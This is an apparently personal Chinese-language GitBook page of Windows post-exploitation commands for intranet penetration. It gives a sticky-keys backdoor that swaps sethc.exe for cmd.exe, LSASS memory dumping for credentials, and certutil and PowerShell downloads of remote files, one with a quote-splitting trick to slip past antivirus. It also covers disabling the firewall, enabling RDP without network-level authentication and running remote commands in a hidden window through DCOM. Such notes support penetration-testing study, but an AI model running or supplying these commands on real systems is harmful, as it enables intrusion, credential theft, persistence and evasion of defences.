+<p><img src="E:/blog/source/images/image-20231117112136859.png" alt="image-20231117112136859"></p>
+<h3 id="rdp&#x540E;&#x95E8;">RDP&#x540E;&#x95E8;</h3>
+<p>&#x62E5;&#x6709;RDP&#x6743;&#x9650;&#xFF0C;&#x5728;&#x5BF9;&#x65B9;&#x9501;&#x5C4F;&#x5E76;&#x4E0D;&#x77E5;&#x9053;&#x5BC6;&#x7801;&#x65F6;&#x4ECD;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x7EC8;&#x7AEF;&#x7684;&#x65B9;&#x6CD5;</p>
+<ul>
+<li><p>&#x7C98;&#x6EDE;&#x952E;</p>
+<blockquote>
+<p>&#x8FDE;&#x7EED;&#x6309;&#x4E0B;<code>SHIFT</code>5 &#x6B21;&#x540E;&#xFF0C;Windows &#x5C06;&#x6267;&#x884C;<code>C:\Windows\System32\sethc.exe</code>.</p>
+<p><img src="E:/blog/source/images/27e711818bea549ace3cf85279f339c8.png" alt="&#x7C98;&#x6EDE;&#x952E;"></p>
+</blockquote>
+<p>&#x5C06;sethc&#x66FF;&#x6362;&#x4E3A;cmd</p>
+<pre class="language-"><code class="lang-cmd">C:\&gt; takeown /f c:\Windows\System32\sethc.exe
+
+SUCCESS: The file (or folder): &quot;c:\Windows\System32\sethc.exe&quot; now owned by user &quot;PURECHAOS\Administrator&quot;.
+
+C:\&gt; icacls C:\Windows\System32\sethc.exe /grant Administrator:F
+processed file: C:\Windows\System32\sethc.exe
+Successfully processed 1 files; Failed processing 0 files
+
+C:\&gt; copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
+        1 file(s) copied.
+</code></pre>
+</li>
+</ul>
+<h1 id="&#x672C;&#x673A;&#x4FE1;&#x606F;&#x6536;&#x96C6;">&#x672C;&#x673A;&#x4FE1;&#x606F;&#x6536;&#x96C6;</h1>
+<pre class="language-"><code class="lang-cmd"># &#x7F51;&#x5361;
+ipconfig /all
+
+# &#x8DEF;&#x7531;
+route print
+
+# arp&#x7F13;&#x5B58;
+arp -a
+
+# &#x57DF;&#xFF0C;&#x8865;&#x4E01;&#xFF0C;&#x7CFB;&#x7EDF;&#x578B;&#x53F7;
+systeminfo
+
+# &#x67E5;&#x770B;&#x5B89;&#x88C5;&#x7A0B;&#x5E8F;&#x548C;&#x7248;&#x672C;&#x4FE1;&#x606F;
+wmic product get name,version
+
+# &#x8FDB;&#x7A0B;
+tasklist
+</code></pre>
+<h1 id="windows&#x547D;&#x4EE4;">Windows&#x547D;&#x4EE4;</h1>
+<h2 id="dump&#x5185;&#x5B58;">dump&#x5185;&#x5B58;</h2>
+<pre class="language-"><code class="lang-cmd"># &#x67E5;&#x770B;LsassPi
+
+# &#x547D;&#x4EE4;&#x884C;
+procdump.exe   -r -ma  lsass.exe  output_name # &#x9ED8;&#x8BA4;&#x4FDD;&#x5B58;&#x5230;&#x5F53;&#x524D;&#x8DEF;&#x5F84;&#x4E0B;&#x7684;output_name.dmp
+sqldump.exe LsassPid 0 0x01100
+
+# &#x56FE;&#x5F62;&#x754C;&#x9762;
+&#x4EFB;&#x52A1;&#x7BA1;&#x7406;&#x5668;-&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;(detail)-&#x53F3;&#x952E;&#x8F6C;&#x50A8;-&#x9ED8;&#x8BA4;&#x4FDD;&#x5B58;&#x5230;C:\Users\xxx\AppData\Local\Temp\&#x4E0B;
+process explore-&#x53F3;&#x952E;&#x8F6C;&#x50A8;
+</code></pre>
+<h2 id="&#x6587;&#x4EF6;&#x64CD;&#x4F5C;">&#x6587;&#x4EF6;&#x64CD;&#x4F5C;</h2>
+<ul>
+<li><p>&#x6587;&#x4EF6;&#x4F20;&#x8F93;</p>
+<ul>
+<li><p>&#x539F;&#x751F;&#x547D;&#x4EE4;</p>
+<pre class="language-"><code class="lang-cmd">powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&apos;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>remote_file</span><span class="token punctuation">&gt;</span></span>&apos;,&apos;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>file</span><span class="token punctuation">&gt;</span></span>&apos;)&quot;
+powershell (new-object System.Net.WebClient).DownloadFile(&apos;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>remote_file</span><span class="token punctuation">&gt;</span></span>&apos;,&apos;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>file</span><span class="token punctuation">&gt;</span></span>&apos;)
+
+bitsadmin /transfer n <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>remote_file</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;</span><span class="token punctuation">&gt;</span></span>
+
+certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php
+
+&#x7ED5;&#x8FC7;&#x706B;&#x7ED2;&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;&#xFF0C;&#x5355;&#x8BCD;&#x52A0;&#x53CC;&#x5F15;&#x53F7;&#xFF0C;&#x4E2D;&#x95F4;&#x53EF;&#x4EE5;&#x63D2;&#x5165;&#x4EFB;&#x610F;&#x6570;&#x91CF;&#x7684;&#x6210;&#x5BF9;&#x53CC;&#x5F15;&#x53F7;
+&quot;c&quot;&quot;e&quot;&quot;r&quot;&quot;t&quot;&quot;u&quot;&quot;t&quot;&quot;i&quot;&quot;l&quot; -&quot;u&quot;&quot;r&quot;&quot;l&quot;&quot;c&quot;&quot;a&quot;&quot;c&quot;&quot;h&quot;&quot;e&quot; -split -f https://url/1.exe 1.exe
+</code></pre>
+</li>
+<li><p>&#x5C0F;&#x5DE5;&#x5177;</p>
+<pre class="language-"><code class="lang-cmd">echo y | pscp.exe -pw ssh&#x5BC6;&#x7801; -P ssh&#x7AEF;&#x53E3;  &quot;&#x5355;&#x4E2A;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&quot;    user@ip:&#x4FDD;&#x5B58;&#x8DEF;&#x5F84;
+echo y | pscp.exe -pw ssh&#x5BC6;&#x7801; -P ssh&#x7AEF;&#x53E3;  -r &quot;&#x76EE;&#x5F55;&#x8DEF;&#x5F84;&quot;    user@ip:&#x4FDD;&#x5B58;&#x8DEF;&#x5F84;
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p>&#x6587;&#x4EF6;/&#x76EE;&#x5F55;&#x67E5;&#x627E;</p>
+<pre class="language-"><code class="lang-cmd"># &#x5217;&#x51FA;&#x6240;&#x6709;&#x6587;&#x4EF6;
+dir /b /s c:\ &gt; c.txt
+
+# &#x67E5;&#x627E;&#x6587;&#x4EF6;
+dir c:\ /s /b | find &quot;win.ini&quot;
+
+# &#x9012;&#x5F52;&#x641C;&#x7D22;E&#x76D8;&#xFF0C;&#x540E;&#x7F00;&#x4E3A;exe&#xFF0C;&#x4FEE;&#x6539;&#x65E5;&#x671F;&gt;=2023/12/16&#x7684;&#x6587;&#x4EF6;
+FORFILES /P E:\ /S /M *.exe /C &quot;cmd /c echo @path&quot; /D +2023/12/16 &gt; res.txt
+</code></pre>
+</li>
+<li><p>&#x6587;&#x4EF6;&#x5199;&#x5165;</p>
+<pre class="language-"><code class="lang-cmd">echo &quot;&quot; &gt;&gt; shell.php
+</code></pre>
+<pre class="language-"><code class="lang-cmd">certutil&#x7F16;&#x7801;&#x6587;&#x4EF6; certutil -encode 1.txt output.txt
+certutil&#x89E3;&#x7801;&#x6587;&#x4EF6; certutil -decode output.txt input.txt
+</code></pre>
+<pre class="language-"><code class="lang-cmd">powershell -c &quot;&apos;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&apos; | Out-File input.txt -Append&quot;
+
+# &#x5199;&#x5165;
+powershell -c &quot;add-content &#x6587;&#x4EF6; -value \&quot;&#x6587;&#x4EF6;&#x5185;&#x5BB9;\&quot;&quot;
+# &#x53BB;&#x9664;&#x6362;&#x884C;
+powershell &quot;-join((gc -LiteralPath \&quot;&#x6587;&#x4EF6;\&quot;))&quot;
+</code></pre>
+</li>
+<li><p>&#x89E3;&#x538B;&#x7F29;</p>
+<ul>
+<li><p>windows&#x81EA;&#x5E26;&#x547D;&#x4EE4;</p>
+<p>&#x5355;&#x4E2A;&#x6587;&#x4EF6;</p>
+<pre class="language-"><code class="lang-cmd"># &#x89E3;&#x538B;
+expand -r file.zip extract_path
+
+# &#x538B;&#x7F29;
+makecab 1.txt 1.zip
+</code></pre>
+<p>&#x591A;&#x6587;&#x4EF6;</p>
+<pre class="language-"><code class="lang-cmd"># &#x5047;&#x8BBE;&#x73B0;&#x6709;&#x6587;&#x4EF6;&#x5939;test
+E:\test\&#x6587;&#x4EF6;1.txt
+E:\test\&#x6587;&#x4EF6;2.txt
+E:\test\abc\&#x6587;&#x4EF6;3.txt
+
+#&#x8981;&#x538B;&#x7F29;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#x5939;&#x9700;&#x8981;&#x5C06;test&#x4E0B;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x5217;&#x4E00;&#x4E2A;&#x6E05;&#x5355;&#xFF0C;&#x6BD4;&#x5982;E:\list.txt&#xFF1A;
+test\&#x6587;&#x4EF6;1.txt
+test\&#x6587;&#x4EF6;2.txt
+test\abc\&#x6587;&#x4EF6;3.txt
+
+# &#x6267;&#x884C;&#x538B;&#x7F29;&#xFF0C;&#x6700;&#x540E;&#x751F;&#x6210;&#x4E00;&#x4E2A;cab&#x6587;&#x4EF6;&#xFF0C;&#x6539;&#x540E;&#x7F00;&#x4E3A;zip&#x5373;&#x53EF;&#xFF0C;&#x800C;&#x4E14;&#x751F;&#x6210;&#x7684;zip&#x5185;&#x90E8;&#x6587;&#x4EF6;&#x5168;&#x90E8;&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x5939;&#x4E0B;
+makecab /f F:\list.txt
+
+#&#x89E3;&#x538B;&#xFF08;&#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x5939;&#x5FC5;&#x987B;&#x5B58;&#x5728;&#xFF0C;&#x5426;&#x5219;&#x4E0D;&#x6210;&#x529F;&#xFF09;&#xFF1A;
+expand -F:* test.zip E:\output\
+</code></pre>
+</li>
+<li><p>Rar64.exe</p>
+<pre class="language-"><code class="lang-cmd">&#x538B;&#x7F29;&#x6587;&#x4EF6;&#x5939;&#xFF08;&#x4E0D;&#x5305;&#x542B;&#x5B50;&#x76EE;&#x5F55;&#xFF09;&#xFF1A;
+rar.exe a &quot;&#x538B;&#x7F29;&#x5305;&#x4FDD;&#x5B58;&#x8DEF;&#x5F84;&#x6587;&#x4EF6;&#x540D;&quot; &quot;&#x88AB;&#x538B;&#x7F29;&#x7684;&#x6587;&#x4EF6;&#x5939;&#x8DEF;&#x5F84;&quot;
+
+&#x538B;&#x7F29;&#x6587;&#x4EF6;&#x5939;&#xFF08;&#x5305;&#x542B;&#x5B50;&#x76EE;&#x5F55;&#xFF09;&#xFF1A;
+rar.exe a -r &quot;&#x538B;&#x7F29;&#x5305;&#x4FDD;&#x5B58;&#x8DEF;&#x5F84;&#x6587;&#x4EF6;&#x540D;&quot; &quot;&#x88AB;&#x538B;&#x7F29;&#x7684;&#x6587;&#x4EF6;&#x5939;&#x8DEF;&#x5F84;&quot;
+
+&#x538B;&#x7F29;&#x6587;&#x4EF6;&#x5939;&#xFF08;&#x4EE5;&#x65F6;&#x95F4;&#x547D;&#x540D;&#x538B;&#x7F29;&#x5305;&#xFF09;&#xFF1A;
+rar.exe a -ag -r -s -ibck &quot;&#x538B;&#x7F29;&#x5305;&#x4FDD;&#x5B58;&#x8DEF;&#x5F84;&#xFF08;&#x8BB0;&#x5F97;&#x5728;&#x6700;&#x540E;&#x52A0;\&#xFF09;&quot; &quot;&#x88AB;&#x538B;&#x7F29;&#x7684;&#x6587;&#x4EF6;&#x5939;&#x8DEF;&#x5F84;&quot;
+</code></pre>
+</li>
+<li><p>7z.exe</p>
+<pre class="language-"><code class="lang-cmd">7z a -mx -myx -mmt=off -ms=on -mtm=off -mtc=off -mta=off -mtr=off -m0=LZMA:d=384m:fb=273:lc=8 -mmc=1000000000 -- &quot;&#x538B;&#x7F29;&#x5305;&#x4FDD;&#x5B58;&#x8DEF;&#x5F84;&#x6587;&#x4EF6;&#x540D;&quot; &quot;Users\*&quot;
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="&#x9632;&#x706B;&#x5899;&#x64CD;&#x4F5C;">&#x9632;&#x706B;&#x5899;&#x64CD;&#x4F5C;</h2>
+<p>&#x4F7F;&#x7528;&#x547D;&#x4EE4;&#x884C;&#x7BA1;&#x7406; Windows &#x9632;&#x706B;&#x5899; - Windows Security | Microsoft Learn
+<a href="https://learn.microsoft.com/zh-cn/windows/security/operating-system-security/network-security/windows-firewall/configure-with-command-line?tabs=cmd" target="_blank">https://learn.microsoft.com/zh-cn/windows/security/operating-system-security/network-security/windows-firewall/configure-with-command-line?tabs=cmd</a></p>
+<pre class="language-"><code class="lang-cmd"># &#x9AD8;&#x7248;&#x672C;&#x7CFB;&#x7EDF;
+netsh advfirewall firewall
+netsh firewall
+
+# &#x4F4E;&#x7248;&#x672C;&#x7CFB;&#x7EDF;
+netsh firewall
+</code></pre>
+<pre class="language-"><code class="lang-cmd"># &#x67E5;&#x770B;&#x9632;&#x706B;&#x5899;&#x89C4;&#x5219;
+netsh firewall show config
+netsh firewall show state
+
+# &#x5F00;&#x542F;&#x9632;&#x706B;&#x5899;
+netsh advfirewall set allprofiles state on
+# &#x5173;&#x95ED;&#x9632;&#x706B;&#x5899;
+netsh advfirewall set allprofiles state off
+</code></pre>
+<h2 id="&#x6CE8;&#x518C;&#x8868;&#x64CD;&#x4F5C;">&#x6CE8;&#x518C;&#x8868;&#x64CD;&#x4F5C;</h2>
+<h2 id="&#x65E5;&#x5FD7;&#x64CD;&#x4F5C;">&#x65E5;&#x5FD7;&#x64CD;&#x4F5C;</h2>
+<h2 id="powershell&#x547D;&#x4EE4;">Powershell&#x547D;&#x4EE4;</h2>
+<pre class="language-"><code class="lang-cmd"># &#x67E5;&#x770B;Powershell&#x5386;&#x53F2;&#x547D;&#x4EE4;
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type %appdata%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+</code></pre>
+<h2 id="&#x5E38;&#x7528;&#x7684;&#x7CFB;&#x7EDF;&#x53D8;&#x91CF;">&#x5E38;&#x7528;&#x7684;&#x7CFB;&#x7EDF;&#x53D8;&#x91CF;</h2>
+<pre class="language-"><code>&#x67E5;&#x770B;&#x5F53;&#x524D;&#x7528;&#x6237;&#x76EE;&#x5F55;%HOMEPATH
+&#x67E5;&#x770B;&#x5F53;&#x524D;&#x76EE;&#x5F55;%CD%
+&#x5217;&#x51FA;&#x7528;&#x6237;&#x5171;&#x4EAB;&#x4E3B;&#x76EE;&#x5F55;&#x7684;&#x7F51;&#x7EDC;&#x8DEF;&#x5F84;%HOMESHARE%
+&#x5217;&#x51FA;&#x6709;&#x6548;&#x7684;&#x5F53;&#x524D;&#x767B;&#x5F55;&#x4F1A;&#x8BDD;&#x7684;&#x57DF;&#x540D;&#x63A7;&#x5236;&#x5668;&#x540D;
+&#x5217;&#x51FA;&#x4E86;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x7684;&#x641C;&#x7D22;&#x8DEF;&#x5F84;%Path%
+&#x5217;&#x51FA;&#x4E86;&#x5904;&#x7406;&#x5668;&#x7684;&#x82AF;&#x7247;&#x67B6;&#x6784;%PROCESSOR_ARCHITECTURE%
+&#x5217;&#x51FA;&#x4E86;Program Files&#x6587;&#x4EF6;&#x5939;&#x7684;&#x8DEF;&#x5F84;%ProgramFiles%
+&#x5217;&#x51FA;&#x4E86;&#x5F53;&#x524D;&#x767B;&#x5F55;&#x7684;&#x7528;&#x6237;&#x53EF;&#x7528;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x9ED8;&#x8BA4;&#x4E34;&#x65F6;&#x76EE;&#x5F55;%TEMP% and %TMP%
+&#x5217;&#x51FA;&#x4E86;&#x5F53;&#x524D;&#x767B;&#x5F55;&#x7684;&#x7528;&#x6237;&#x53EF;&#x7528;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x9ED8;&#x8BA4;&#x4E34;&#x65F6;&#x76EE;&#x5F55;%TEMP% and %TMP%
+&#x5217;&#x51FA;&#x4E86;&#x5305;&#x542B;&#x7528;&#x6237;&#x5E10;&#x53F7;&#x7684;&#x57DF;&#x7684;&#x540D;&#x5B57;%USERDOMAIN%
+&#x5217;&#x51FA;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x76EE;&#x5F55;&#x7684;&#x4F4D;&#x7F6E;%WINDIR%
+&#x8FD4;&#x56DE;&#x201C;&#x6240;&#x6709;&#x7528;&#x6237;&#x201D;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;%ALLUSERSPROFILE%
+&#x8FD4;&#x56DE;&#x5904;&#x7406;&#x5668;&#x6570;&#x76EE;%NUMBER_OF_PROCESSORS%
+powershell&#x5730;&#x5740;%PSModulePath%
+</code></pre><h2 id="&#x8BA1;&#x5212;&#x4EFB;&#x52A1;">&#x8BA1;&#x5212;&#x4EFB;&#x52A1;</h2>
+<p><strong>Windows Server 2012 &#x4EE5;&#x540E;&#x7684;&#x7248;&#x672C;&#x6CA1;&#x6709;at&#x547D;&#x4EE4;&#xFF0C;&#x53EA;&#x6709;schtasks&#x547D;&#x4EE4;</strong></p>
+<h2 id="rdp&#x8FDC;&#x7A0B;&#x684C;&#x9762;">RDP&#x8FDC;&#x7A0B;&#x684C;&#x9762;</h2>
+<pre class="language-"><code class="lang-cmd"># &#x8FDE;&#x63A5;rdp
+win+r mstsc
+
+# &#x67E5;&#x8BE2;&#x6CE8;&#x518C;&#x8868;&#xFF0C;&#x82E5;&#x5B57;&#x6BB5;&#x503C;&#x4E3A;0&#xFF0C;&#x5219;&#x8868;&#x793A;&#x5DF2;&#x542F;&#x52A8;RDP&#xFF1B;&#x82E5;&#x4E3A;1&#xFF0C;&#x5219;&#x8868;&#x793A;&#x7981;&#x7528;RDP
+reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections 
+
+# &#x5F00;&#x542F;&#x8FDC;&#x7A0B;&#x684C;&#x9762; 
+reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f 
+
+# &#x5173;&#x95ED;&#x201C;&#x4EC5;&#x5141;&#x8BB8;&#x8FD0;&#x884C;&#x4F7F;&#x7528;&#x7F51;&#x7EDC;&#x7EA7;&#x522B;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x7684;&#x8FDC;&#x7A0B;&#x684C;&#x9762;&#x7684;&#x8BA1;&#x7B97;&#x673A;&#x8FDE;&#x63A5;&#x201D;&#xFF08;&#x9274;&#x6743;&#xFF09; 
+reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0  
+
+# &#x8BBE;&#x7F6E;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x653E;&#x884C;3389&#x7AEF;&#x53E3; 
+netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow
+</code></pre>
+<h2 id="dcom&#x7EC4;&#x4EF6;&#x6267;&#x884C;&#x547D;&#x4EE4;">DCOM&#x7EC4;&#x4EF6;&#x6267;&#x884C;&#x547D;&#x4EE4;</h2>
+<pre class="language-"><code class="lang-cmd">$com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;IP&quot;))
+
+# &#x7B2C;&#x4E09;&#x4E2A;&#x53C2;&#x6570;Minimized&#x7528;&#x4E8E;&#x9690;&#x85CF;cmd&#x7A97;&#x53E3;
+$com.Document.ActiveView.ExecuteShellCommand(&apos;cmd.exe&apos;,$null,&quot;/c <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>command</span><span class="token punctuation">&gt;</span></span>&quot;,&quot;Minimized&quot;)
+</code></pre>
+<footer class="page-footer"><span class="copyright">Copyright &#xA9; Khaz 2024 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x8BE5;&#x6587;&#x7AE0;&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
+2024-07-10 20:42:25
+</span></footer>
+<script>console.log("plugin-popup....");document.onclick = function(e){ e.target.tagName === "IMG" && window.open(e.target.src,e.target.src)}</script><style>img{cursor:pointer}</style>
+                        
+                    </section>
+                    
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+
+        
+        
+        
+        <a href="入侵痕迹清理.html" class="navigation navigation-next navigation-unique" aria-label="Next page: 入侵痕迹清理">
+            <i class="fa fa-angle-right"></i>
+        </a>
+        
+        
+        
+    </div>
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Windows内网渗透","level":"1.3.2.1","depth":3,"next":{"title":"入侵痕迹清理","level":"1.3.2.2","depth":3,"path":"02.后渗透/Windows域渗透/入侵痕迹清理.md","ref":"02.后渗透/Windows域渗透/入侵痕迹清理.md","articles":[]},"previous":{"title":"Windows域渗透","level":"1.3.2","depth":2,"ref":"","articles":[{"title":"Windows内网渗透","level":"1.3.2.1","depth":3,"path":"02.后渗透/Windows域渗透/Windows内网渗透.md","ref":"02.后渗透/Windows域渗透/Windows内网渗透.md","articles":[]},{"title":"入侵痕迹清理","level":"1.3.2.2","depth":3,"path":"02.后渗透/Windows域渗透/入侵痕迹清理.md","ref":"02.后渗透/Windows域渗透/入侵痕迹清理.md","articles":[]},{"title":"后渗透之了解","level":"1.3.2.3","depth":3,"path":"02.后渗透/Windows域渗透/后渗透之了解.md","ref":"02.后渗透/Windows域渗透/后渗透之了解.md","articles":[]},{"title":"后渗透之基础知识","level":"1.3.2.4","depth":3,"path":"02.后渗透/Windows域渗透/后渗透之基础知识.md","ref":"02.后渗透/Windows域渗透/后渗透之基础知识.md","articles":[]},{"title":"后渗透之权限提升","level":"1.3.2.5","depth":3,"path":"02.后渗透/Windows域渗透/后渗透之权限提升.md","ref":"02.后渗透/Windows域渗透/后渗透之权限提升.md","articles":[]},{"title":"后渗透之权限维持","level":"1.3.2.6","depth":3,"path":"02.后渗透/Windows域渗透/后渗透之权限维持.md","ref":"02.后渗透/Windows域渗透/后渗透之权限维持.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["splitter","hide-element","code","theme-d4t","-lunr","-search","-sharing","search-pro-fixed","-highlight","chapter-fold","expandable-chapters","popup","donate","tbfed-pagefooter","github","flexible-alerts","prism","back-to-top-button","auto-scroll-table","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"theme-d4t":{},"tbfed-pagefooter":{"copyright":"Copyright &copy Khaz 2024","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"prism":{"css":["prismjs/themes/prism-tomorrow.css"],"lang":{"flow":"typescript"},"ignore":["mermaid","eval-js","ascii","result","manifest","payload","google","tree","java_out","log4j2","jsp","class","Exception","stack","c#","xml-dtd","C++","twig","jinja2","exception","tpl"]},"github":{"url":"https://github.com/"},"d4t":{"search-placeholder":"请输入关键字搜索","logo":"/README.assets/logo.svg","favicon":"/README.assets/favicon.ico"},"livereload":{},"splitter":{},"auto-scroll-table":{},"popup":{},"code":{"copyButtons":true},"search-pro-fixed":{},"donate":{"alipay":"/README.assets/gzh_1.png","alipayText":"点点广告🙏","button":"支持作者","title":"","wechat":"/README.assets/gzh_0.png","wechatText":"关闭Adblock"},"hide-element":{"elements":[".gitbook-link",".title",".treeview__copyright",".treeview__main-title"]},"fontsettings":{"theme":"white","family":"sans","size":2},"back-to-top-button":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"},"comment":{"label":"Comment","icon":"fa fa-comments","className":"info"}},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"Khaz","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Khaz's 知识库","gitbook":"*","description":"个人的部分知识技能","theme-default":{"showLevel":true}},"file":{"path":"02.后渗透/Windows域渗透/Windows内网渗透.md","mtime":"2024-07-10T12:42:25.143Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2024-12-29T12:32:08.665Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-hide-element/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro-fixed/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro-fixed/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-flexible-alerts/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-back-to-top-button/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-auto-scroll-table/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-theme-d4t/script.js"></script>
+        
+    
+
+    </body>
+</html>
+
